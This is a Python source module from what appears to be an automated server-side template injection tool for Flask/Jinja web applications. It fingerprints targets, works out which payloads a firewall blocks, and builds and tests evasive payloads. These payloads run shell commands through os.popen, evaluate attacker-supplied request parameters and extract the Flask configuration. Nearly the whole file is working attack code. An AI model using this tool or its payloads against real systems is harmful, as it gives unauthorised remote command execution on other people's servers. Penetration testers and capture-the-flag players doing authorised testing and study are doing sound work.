"""攻击指定的路径"""

import functools
import logging
import random
import re
import sys
import string
import time

from collections import namedtuple
from string import ascii_lowercase

from rich.markup import escape as rich_escape

from .rules_types import TargetAndSubTargets
from .rules_utils import find_bad_exprs, tree_precedence, unparse, iter_subtree
from .requester import HTTPRequester
from .form import random_fill
from .submitter import (
    FormSubmitter,
    RequestSubmitter,
    Submitter,
    ExtraParamAndDataCustomizable,
)
from .pbar import pbar_manager
from .const import (
    PythonVersion,
    AutoFix500Code,
    ATTRIBUTE,
    ITEM,
    CHAINED_ATTRIBUTE_ITEM,
    STRING,
    CONFIG,
    EVAL,
    OS_POPEN_READ,
    FLASK_CONTEXT_VAR,
    WHITESPACES,
)
from .waf_func_gen import WafFuncGen, KeywordWafFuncGen, WafFunc
from .full_payload_gen import FullPayloadGen
from .context_vars import ContextVariableManager
from .options import Options


if sys.version_info >= (3, 8):
    from typing import Union, Callable, Dict, Tuple, List
else:
    from typing_extensions import Union, Callable, Dict, Tuple, Literal, List
logger = logging.getLogger("cracker")
Result = namedtuple("Result", "full_payload_gen input_field")
TestProbe = namedtuple("TestProbe", "payload result")
DetailedCrackResult = namedtuple(
    "DetailedCrackResult",
    "full_payload_gen payload will_print test_result tree probe",
)


def normalize_newlines(text: str) -> str:
    return text.replace("\r\n", "\n").replace("\r", "\n")


def make_expr_waf_not500(
    submitter: Submitter,
    tree,
    outer_pattern: str,
    context_vars: ContextVariableManager,
):
    def is_expr_bad(expr):
        payload = "".join(
            [
                *context_vars.get_payload(context_vars.get_context()),
                outer_pattern.replace("PAYLOAD", expr),
            ]
        )
        result = submitter.submit(payload)
        assert result is not None
        status_code, _ = result
        logger.info(
            "payload [blue]%s[/] generate status code [yellow]%d[/]",
            rich_escape(payload),
            status_code,
            extra={"markup": True, "highlighter": None},
        )
        return status_code == 500

    exprs = [payload for payload, _ in find_bad_exprs(tree, is_expr_bad)]

    @functools.lru_cache(500)
    def new_waf(s):
        return all(expr not in s for expr in exprs) and not is_expr_bad(s)

    return new_waf


def apply_waf_expr_func(full_payload_gen: FullPayloadGen, waf_expr_func: WafFunc):
    full_payload_gen.waf_expr_func = (
        waf_expr_func
        if full_payload_gen.waf_expr_func is None
        else (
            lambda s, original=full_payload_gen.waf_expr_func, new=waf_expr_func: (
                original(s) and new(s)
            )
        )
    )
    if full_payload_gen.payload_gen is None:
        return
    full_payload_gen.payload_gen.waf_func = (
        full_payload_gen.waf_func
        if full_payload_gen.waf_expr_func is None
        else (
            lambda x,
            waf=full_payload_gen.waf_func,
            waf_expr=full_payload_gen.waf_expr_func: waf(x) and waf_expr(x)
        )
    )
    full_payload_gen.payload_gen.cache_by_repr.clear()


def make_expr_excluder(excluded_exprs):
    excluded_exprs = frozenset(excluded_exprs)

    @functools.lru_cache(5000)
    def new_waf(s):
        return strip_ignorable_whitespace(s) not in excluded_exprs

    return new_waf


def collect_tree_exprs(tree):
    return {
        expr
        for expr, _ in iter_subtree(tree)
        if expr
    }


def normalize_expr_by_context(expr: str, context: Dict) -> str:
    normalized = strip_ignorable_whitespace(expr)
    replacements = []
    for key, (value, _) in context.items():
        if not isinstance(key, str) or not re.match(r"^[A-Za-z_][A-Za-z0-9_]*$", key):
            continue
        if isinstance(value, (str, int)):
            replacements.append((key, f"<{type(value).__name__}:{value!r}>"))
    replacements.sort(key=lambda item: len(item[0]), reverse=True)
    for key, replacement in replacements:
        normalized = re.sub(rf"\b{re.escape(key)}\b", replacement, normalized)
    return normalized


def strip_ignorable_whitespace(expr: str) -> str:
    whitespace_chars = set(WHITESPACES)
    result = []
    quote_char = None
    escaped = False
    for ch in expr:
        if quote_char is not None:
            result.append(ch)
            if escaped:
                escaped = False
            elif ch == "\\":
                escaped = True
            elif ch == quote_char:
                quote_char = None
            continue
        if ch in ("'", '"'):
            quote_char = ch
            result.append(ch)
            continue
        if ch in whitespace_chars:
            continue
        result.append(ch)
    return "".join(result)


def collect_normalized_tree_exprs(tree, context: Dict):
    return {
        normalize_expr_by_context(expr, context)
        for expr, _ in iter_subtree(tree)
        if expr
    }


IMPORTANT_CHAIN_TOKENS = {
    "lipsum",
    "cycler",
    "joiner",
    "namespace",
    "config",
    "url_for",
    "g",
    "request",
    "session",
    "self",
    "__globals__",
    "__builtins__",
    "__getitem__",
    "__init__",
    "__class__",
    "__dict__",
    "os",
    "sys",
    "modules",
    "import",
    "eval",
    "get",
    "pop",
    "next",
    "reset",
    "close",
    "popen",
    "read",
    "attr",
}


def build_chain_family_signature(expr: str, context: Dict) -> str:
    normalized = normalize_expr_by_context(expr, context)
    normalized = re.sub(r"'([^'\\]|\\.)*'", "'<str>'", normalized)
    normalized = re.sub(r'"([^"\\]|\\.)*"', '"<str>"', normalized)
    for func_name in ("popen", "read", "eval"):
        normalized = re.sub(rf"\b{func_name}\([^()]*\)", f"{func_name}()", normalized)
    normalized = re.sub(
        r"<str:'([^']*)'>",
        lambda match: (
            f"<str:{match.group(1)}>"
            if match.group(1) in IMPORTANT_CHAIN_TOKENS
            else "<str>"
        ),
        normalized,
    )
    normalized = re.sub(r"<int:[^>]+>", "<int>", normalized)

    def replace_identifier(match):
        token = match.group(0)
        if token in IMPORTANT_CHAIN_TOKENS or token in {"True", "False", "None"}:
            return token
        if token.startswith("__") and token.endswith("__"):
            return "<dunder>"
        return "<id>"

    return re.sub(r"\b[A-Za-z_][A-Za-z0-9_]*\b", replace_identifier, normalized)


def guess_python_version(
    url: str, requester: HTTPRequester
) -> Tuple[PythonVersion, Union[int, None]]:
    """猜测目标的python版本

    Args:
        url (str): 目标的url
        requester (Requester): 用于发送请求的requester

    Returns:
        PythonEnvironment: python版本
    """
    resp = requester.request(method="GET", url=url)
    if resp is None:
        return PythonVersion.UNKNOWN, None
    header = resp.headers.get("Server", "")
    version_regexp = re.search(r"Python/(\d)(\.?\d+)?", header)
    if not version_regexp:
        return PythonVersion.UNKNOWN, None
    version, subversion = (
        (
            PythonVersion.PYTHON3,
            (int(version_regexp.group(2)[1:]) if version_regexp.group(2) else None),
        )
        if version_regexp.group(1) == "3"
        else (PythonVersion.PYTHON2, None)
    )
    logger.info(
        "Target is [blue bold]%s.%s[/]",
        version.value,
        str(subversion) if subversion else "x",
        extra={"markup": True, "highlighter": None},
    )
    return version, subversion


def guess_is_flask(submitter: Submitter):
    payloads = [
        (pattern.replace("VAR", var), text)
        for var, text in [
            ("g", "flask.g"),
            ("request", "Request "),
            ("session", "Session "),
        ]
        for pattern in [
            "{{VAR}}",
            "{%print VAR%}",
            "{%print(VAR)%}",
            "{%print\nVAR%}",
            "{%print\tVAR%}",
            "{%print\rVAR%}",
        ]
    ]
    with pbar_manager.pbar(payloads, "guess_template_environment") as payloads:
        for payload, text in payloads:
            result = submitter.submit(payload)
            if result is None or text not in result.text:
                continue
            logger.info(
                "It might be [cyan bold]flask[/] because "
                "we see [blue]%s[/] in [yellow]%s[/]",
                rich_escape(repr(text)),
                rich_escape(repr(payload)),
                extra={"markup": True, "highlighter": None},
            )
            return True
    return False


class EvalArgsModePayloadGen:
    """在EvalArgs模式下的payload生成器"""

    def __init__(self, will_print):
        self.will_print = will_print

    def generate(self, gen_type, *args):
        """生成EvalArgs模式下的payload"""
        if gen_type == OS_POPEN_READ:
            return f"__import__('os').popen({repr(args[0])}).read()", self.will_print
        elif gen_type == EVAL:
            req = args[0]
            if req[0] == STRING:
                return f"eval({req[1]!r})", self.will_print
            elif (
                req[0] == ITEM
                and req[0][1][0] == ATTRIBUTE
                and req[0][1][1] == "values"
                and req[0][1][0][1][0] == FLASK_CONTEXT_VAR
                and req[0][1][0][1][1] == "request"
            ):
                # i wish i can use `match`
                # its something like request.values.xxx
                key = req[1]
                return f"eval(request.values.{key})", self.will_print
            else:
                assert False, f"Unsupported payload {req=}"
        elif gen_type == CONFIG:
            return (
                "[v.config for v in sys.modules['__main__'].__dict__.values()"
                + " if isinstance(v, sys.modules['flask'].Flask)][0]",
                self.will_print,
            )
        return None, None


class Cracker:
    """
    针对某个网站进行攻击
    """

    # Keep the probe output distinct from the raw command string so reflected
    # payloads are not misclassified as execution results.
    shell_test_probes = (
        TestProbe("echo fen&&echo jing", "fen\njing"),
        TestProbe("echo f3n&&echo j1ng", "f3n\nj1ng"),
    )
    eval_test_probes = (
        TestProbe("'fen'+' jing'", "fen jing"),
        TestProbe("'f'+str(3)+'n j'+str(1)+\"ng\"", "f3n j1ng"),
    )
    test_cmd = shell_test_probes[0].payload
    test_cmd_result = shell_test_probes[0].result
    test_eval = eval_test_probes[0].payload
    test_eval_result = eval_test_probes[0].result
    echo_probe_patterns = [
        ("${WS}{{${WS}PAYLOAD${WS}}}${WS}", "()"),
        ("${WS}{%${WS}print PAYLOAD${WS}%}${WS}", "()"),
        ("${WS}{%${WS}print(${WS}PAYLOAD${WS})${WS}%}${WS}", "()"),
        ("${WS}{%${WS}print(${WS}x${WS},${WS}PAYLOAD${WS},${WS}x${WS})${WS}%}${WS}", "()"),
    ]

    def __init__(
        self,
        submitter: Submitter,
        callback: Union[Callable[[str, Dict], None], None] = None,
        options: Union[Options, None] = None,
    ):
        self.options = options if options else Options()
        self.subm = submitter

        self._callback: Callable[[str, Dict], None] = (
            callback if callback else (lambda x, y: None)
        )
        self.waf_func_gen = (
            KeywordWafFuncGen(
                submitter, self.options.waf_keywords, callback=callback, options=options
            )
            if self.options.waf_keywords
            else WafFuncGen(submitter, callback=callback, options=options)
        )

    @property
    def callback(self):
        """Callback函数

        Returns:
            Callable: Callback函数
        """
        return self._callback

    @callback.setter
    def callback(self, callback):
        self._callback = callback
        self.waf_func_gen.callback = callback

    def test_payload(
        self,
        payload: str,
        will_print: bool,
        expected_result: Union[str, None] = None,
    ) -> str:
        """测试某个执行shell指令的payload是否会产生回显

        Args:
            payload (str): 用于测试的payload
            will_print (bool): payload是否会产生回显

        Returns:
            str: 测试结果
        """
        logger.info(
            "Testing generated payload.",
            extra={"highlighter": None},
        )
        result = self.subm.submit(payload)
        assert result is not None
        status_code, text = result
        if status_code == 500:
            return "FAIL_500"
        expected_result = (
            self.test_cmd_result if expected_result is None else expected_result
        )
        text = normalize_newlines(text)
        return (
            "SUCCESS"
            if expected_result in text or not will_print
            else "FAIL_UNKNOWN"
        )

    def test_payload_eval_args(
        self,
        payload: str,
        subm: Submitter,
        expected_result: Union[str, None] = None,
    ) -> bool:
        """测试某个进行eval的payload是否会产生回显

        Args:
            payload (str): 用于测试的payload
            subm (Submitter):
                用于提交payload的submitter, 可能和self中的submitter不同

        Returns:
            bool: 是否产生回显
        """
        logger.info(
            "Testing generated payload as eval args.",
            extra={"highlighter": None},
        )
        result = subm.submit(payload)
        assert result is not None
        _, text = result
        expected_result = (
            self.test_eval_result if expected_result is None else expected_result
        )
        return expected_result in normalize_newlines(text)

    def has_respond(self) -> bool:
        """测试对应的submitter是否会产生回显（显示我们提交的数据）

        Returns:
            bool: 是否产生回显
        """
        for _ in range(10):
            content = random.choice(ascii_lowercase) * 6
            resp = self.subm.submit(content)
            assert resp is not None, "HTTP Failed"
            if content in resp.text:
                return True
        return False

    def add_request_args(
        self,
        full_payload_gen: FullPayloadGen,
        waf: WafFunc,
        extra_values: Union[List[str], None] = None,
    ):
        if not isinstance(self.subm, ExtraParamAndDataCustomizable):
            return
        values = ["_", "__", "%", "%c"]
        if extra_values:
            values += extra_values
        used_name = set()
        assert (
            full_payload_gen.payload_gen is not None
        ), "you need to run full_payload_gen.do_prepare()"
        with pbar_manager.pbar(values, "add_request_args") as values:
            for value in values:
                name = "".join(random.choices(string.ascii_lowercase, k=2))
                while name in used_name and waf(name):
                    name = "".join(random.choices(string.ascii_lowercase, k=2))
                target = (
                    ITEM,
                    (ATTRIBUTE, (FLASK_CONTEXT_VAR, "request"), "args"),
                    name,
                )
                result = full_payload_gen.payload_gen.generate_detailed(*target)
                if result is None:
                    logger.warning(
                        "Failed generating [yellow]request.args.%s[/], continue...",
                        rich_escape(name),
                        extra={"markup": True, "highlighter": None},
                    )
                    continue
                payload, context_vars, tree = result
                if context_vars != {}:
                    # if it need other variables to works
                    # like request[var1][var2]
                    # we just skip it bacause its too complex
                    logger.warning(
                        "[blue]%s[/]depends on too many variables, continue",
                        rich_escape(payload),
                        extra={"markup": True, "highlighter": None},
                    )
                    continue

                value_payload = full_payload_gen.payload_gen.generate(STRING, value)
                if value_payload is not None and len(value_payload) < len(payload):
                    # We skip it if the payload of the value is shorter than
                    # the payload for request.args.xxx
                    logger.warning(
                        "[blue]%s[/]depends is too long, continue",
                        rich_escape(payload),
                        extra={"markup": True, "highlighter": None},
                    )
                    continue

                precedence_index = tree_precedence(tree)
                assert (
                    precedence_index is not None
                ), f"failed to calculate precedence for {payload=}"
                logger.info(
                    "Adding [blue]%s=[/][yellow bold]%s[/]",
                    rich_escape(payload),
                    rich_escape(repr(value)),
                    extra={"markup": True, "highlighter": None},
                )
                self.subm.set_extra_param(name, value)
                full_payload_gen.add_request_args(payload, value, precedence_index)

    def try_upgrade_outer_pattern_to_echo(self, full_payload_gen: FullPayloadGen):
        if full_payload_gen.will_print:
            return
        marker = "".join(random.choices(string.ascii_lowercase, k=6))
        for outer_pattern, expected_value in self.echo_probe_patterns:
            for whitespace in ["", " ", "\t", "\n"]:
                rendered_outer = (
                    outer_pattern.replace("${WS}", whitespace).replace(
                        " ", whitespace if whitespace != "" else " "
                    )
                )
                test_payload = marker + rendered_outer.replace("PAYLOAD", "()")
                result = self.subm.submit(test_payload)
                if result is None or result.status_code == 500:
                    continue
                response_text = normalize_newlines(result.text)
                if marker + expected_value in response_text:
                    logger.info(
                        "Upgrade outer pattern to echo mode with [blue]%s[/]",
                        rich_escape(rendered_outer),
                        extra={"markup": True, "highlighter": None},
                    )
                    full_payload_gen.outer_pattern = rendered_outer
                    full_payload_gen.will_print = True
                    return

    def crack_with_waf(
        self, waf_func: WafFunc, waf_expr_func=None
    ) -> Union[Tuple[FullPayloadGen, bool, str, TargetAndSubTargets], None]:
        result = self.crack_with_waf_detailed(waf_func, waf_expr_func)
        if result is None:
            return None
        return result.full_payload_gen, result.will_print, result.test_result, result.tree

    def crack_with_waf_detailed(
        self, waf_func: WafFunc, waf_expr_func=None
    ) -> Union[DetailedCrackResult, None]:
        """实际进行Crack的函数

        Returns:
            Union[Tuple[FullPayloadGen, bool, str, TargetAndSubTargets], None]:
                攻击结果
        """
        full_payload_gen = FullPayloadGen(
            waf_func,
            callback=None,
            options=self.options,
            waf_expr_func=waf_expr_func,
        )
        full_payload_gen.do_prepare()
        assert full_payload_gen.payload_gen is not None
        self.add_request_args(full_payload_gen, waf=waf_func)
        self.try_upgrade_outer_pattern_to_echo(full_payload_gen)
        full_payload_gen.payload_gen.cache_by_repr.clear()
        best_result = None
        best_score = -1
        score_map = {"FAIL_500": 0, "FAIL_UNKNOWN": 1, "SUCCESS": 2}
        for probe in self.shell_test_probes:
            result = full_payload_gen.generate_with_tree(OS_POPEN_READ, probe.payload)
            if result is None:
                continue
            payload, will_print, tree = result
            test_result = self.test_payload(payload, will_print, probe.result)
            if score_map[test_result] > best_score:
                best_result = DetailedCrackResult(
                    full_payload_gen,
                    payload,
                    will_print,
                    test_result,
                    tree,
                    probe.payload,
                )
                best_score = score_map[test_result]
            if test_result == "SUCCESS":
                logger.info(
                    "Bypass WAF payload [blue]%s[/]",
                    rich_escape(payload),
                    extra={"markup": True, "highlighter": None},
                )
                break
        return best_result

    def log_with_result(self, will_print: bool, test_result: str):
        """根据攻击结果打印log

        Args:
            will_print (bool): payload是否会产生回显
            test_result (str): 攻击结果
        """
        if will_print:
            if test_result == "SUCCESS":
                logger.info(
                    "[cyan bold]Success![/] Now we can generate payloads.",
                    extra={"markup": True, "highlighter": None},
                )
            elif test_result == "FAIL_UNKNOWN":
                logger.info(
                    "[yellow bold]Test Payload Failed[/] Generated payloads might be useless.",
                    extra={"markup": True, "highlighter": None},
                )
            else:  # test_result == "FAIL_500"
                logger.info(
                    "Target return status code [yellow bold]500[/]!",
                    extra={"markup": True, "highlighter": None},
                )
        else:
            if test_result == "FAIL_500":
                logger.info(
                    "Target return status code [yellow bold]500[/]! "
                    "(although payload won't print anything)",
                    extra={"markup": True, "highlighter": None},
                )
            else:
                logger.info(
                    "We WON'T SEE the execution result! "
                    + "You can try generating payloads anyway.",
                    extra={"markup": True, "highlighter": None},
                )

    def expr_waf_not500(
        self, tree, outer_pattern, context_vars: ContextVariableManager
    ):
        return make_expr_waf_not500(self.subm, tree, outer_pattern, context_vars)

    def crack(self) -> Union[FullPayloadGen, None]:
        """开始进行攻击，生成一个执行shell命令的payload，测试并返回payload生成器

        Returns:
            Union[FullPayloadGen, None]: 生成器
        """
        result = self.crack_detailed()
        return None if result is None else result.full_payload_gen

    def crack_detailed(self) -> Union[DetailedCrackResult, None]:
        logger.info("Cracking...", extra={"highlighter": None})
        waf_func = self.waf_func_gen.generate()
        result = self.crack_with_waf_detailed(waf_func)
        if not result:
            return None
        full_payload_gen, _, will_print, test_result, tree, _ = result
        assert (
            full_payload_gen.context_vars is not None
        ), "when generated successfully, this should not be none"
        self.log_with_result(will_print, test_result)
        if (
            test_result == "FAIL_500"
            and self.options.autofix_500 == AutoFix500Code.ENABLED
        ):
            logger.warning(
                "[yellow bold]Start fixing status code 500.[/]",
                extra={"markup": True, "highlighter": None},
            )
            logger.warning(
                "[yellow bold]IT MIGHT MAKE YOUR COMMAND EXECUTE TWICE![/]",
                extra={"markup": True, "highlighter": None},
            )
            logger.warning(
                "[yellow bold]Use Ctrl+C to exit if you don't want it![/]",
                extra={"markup": True, "highlighter": None},
            )
            time.sleep(6)
            waf_expr_func = self.expr_waf_not500(
                tree, full_payload_gen.outer_pattern, full_payload_gen.context_vars
            )
            apply_waf_expr_func(full_payload_gen, waf_expr_func)
            result = self.crack_with_waf_detailed(waf_func, waf_expr_func=waf_expr_func)
            if result:
                full_payload_gen, _, will_print, test_result, tree, _ = result
            if test_result == "FAIL_500":
                logger.info(
                    "[yellow bold]It's still 500, sorry...[/]",
                    extra={"markup": True, "highlighter": None},
                )
            self.log_with_result(will_print, test_result)
        return result

    def enumerate_successful_chains(
        self,
        initial_result: Union[DetailedCrackResult, None] = None,
        max_results: int = 8,
    ):
        waf_func = self.waf_func_gen.generate()
        excluded_exprs = set()
        excluded_families = set()
        if initial_result is not None:
            assert initial_result.full_payload_gen.context_vars is not None
            excluded_exprs.add(strip_ignorable_whitespace(unparse(initial_result.tree)))
            excluded_families.add(
                build_chain_family_signature(
                    unparse(initial_result.tree),
                    initial_result.full_payload_gen.context_vars.get_context(),
                )
            )
        waf_expr_func = (
            make_expr_excluder(excluded_exprs) if excluded_exprs else None
        )
        yielded = 0
        attempts = 0
        max_attempts = max_results * 20
        while yielded < max_results and attempts < max_attempts:
            attempts += 1
            result = self.crack_with_waf_detailed(waf_func, waf_expr_func)
            if result is None:
                break
            assert result.full_payload_gen.context_vars is not None
            expr = unparse(result.tree)
            normalized_expr = strip_ignorable_whitespace(expr)
            family_signature = build_chain_family_signature(
                expr,
                result.full_payload_gen.context_vars.get_context(),
            )
            if normalized_expr in excluded_exprs:
                break
            excluded_exprs.add(normalized_expr)
            waf_expr_func = make_expr_excluder(excluded_exprs)
            if family_signature in excluded_families:
                continue
            excluded_families.add(family_signature)
            if result.test_result == "SUCCESS":
                yielded += 1
                yield result

    def crack_eval_args(self) -> Union[Tuple[Submitter, EvalArgsModePayloadGen], None]:
        """开始进行攻击，生成一个会eval GET参数x中命令的payload, 将其放进一个新的submitter中并返回。
        新的submitter会填充GET参数x、提交并返回结果。

        Returns:
            Union[Tuple[FullPayloadGen, Submitter, bool], None]:
                产生的payload生成器，提交器，以及是否会产生回显
        """
        args_target_field = "x"
        logger.info(
            "Cracking with request GET args...",
            extra={"markup": True, "highlighter": None},
        )
        assert isinstance(
            self.subm, FormSubmitter
        ), "Currently onlu FormSubmitter is supported"
        waf_func = self.waf_func_gen.generate()
        full_payload_gen = FullPayloadGen(waf_func, callback=None, options=self.options)
        full_payload_gen.do_prepare()
        assert full_payload_gen.payload_gen is not None
        self.add_request_args(
            full_payload_gen,
            waf_func,
            extra_values=[
                "__globals__",
                "__builtins__",
                "values",
                "eval",
            ],
        )
        full_payload_gen.payload_gen.cache_by_repr.clear()
        payload, will_print = full_payload_gen.generate(
            EVAL,
            (
                CHAINED_ATTRIBUTE_ITEM,
                (FLASK_CONTEXT_VAR, "request"),
                (ATTRIBUTE, "values"),
                (ATTRIBUTE, args_target_field),
            ),
        )
        if payload is None:
            return None
        assert will_print is not None, "It just shouldn't! when payload is not None!"
        payload_dict = {self.subm.target_field: payload}
        method = self.subm.form["method"]
        assert isinstance(method, str)
        payload_param = random_fill(self.subm.form)
        payload_param.update(payload_dict)
        params = self.subm.extra_params.copy()
        data = {}
        if method in ["GET", "HEAD"]:
            params.update(payload_param)
        else:
            data.update(payload_param)

        new_subm = RequestSubmitter(
            url=self.subm.url,
            method=method,
            target_field=args_target_field,
            params=params,
            data=data,
            requester=self.subm.req,
        )
        if self.subm.tamperers:
            for tamperer in self.subm.tamperers:
                new_subm.add_tamperer(tamperer)
        if will_print:
            eval_success = any(
                self.test_payload_eval_args(probe.payload, new_subm, probe.result)
                for probe in self.eval_test_probes
            )
            if eval_success:
                logger.info(
                    "[cran bold]Success[/] Now we can generate payloads.",
                    extra={"markup": True, "highlighter": None},
                )
            else:
                logger.info(
                    "[yellow bold]Test Payload Failed[/] Generated payloads might be useless.",
                    extra={"markup": True, "highlighter": None},
                )
        else:
            logger.info(
                "We WON'T SEE the execution result! You can try generating payloads anyway.",
                extra={"markup": True, "highlighter": None},
            )

        return new_subm, EvalArgsModePayloadGen(will_print)
